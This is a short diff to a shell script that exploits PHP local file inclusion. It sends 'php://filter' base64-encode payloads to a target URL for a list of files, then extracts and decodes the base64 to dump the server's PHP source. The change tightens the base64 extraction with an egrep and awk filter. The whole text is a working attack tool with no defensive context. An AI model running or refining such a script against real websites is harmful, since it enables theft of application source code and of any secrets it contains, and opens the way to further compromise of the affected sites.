@@ -6,6 +6,7 @@ url=$2
 out="out"
 encoded="encoded"
 decoded="decoded"
+base64_filter=10
 
 mkdir $out $out/$encoded $out/$decoded
 for file in $phpfile_table; do
@@ -15,7 +16,8 @@ for file in $phpfile_table; do
   base64_only=$out/$encoded/$filesave_name
   base64_decode=$out/$decoded/$filesave_name
   curl "$url""php://filter/read=convert.base64-encode/resource=$file" -o $download_file
-  grep -o '[A-Za-z0-9+\/]*==' $download_file > $base64_only
+  awk_arg='{if (length($0) > '$base64_filter' && length($0) % 4 == 0 ) print $0}'
+  egrep -o '[A-Za-z0-9+\/]+={0,2}' $download_file| awk "$awk_arg" > $base64_only
   base64 -d $base64_only > $base64_decode
 done
 
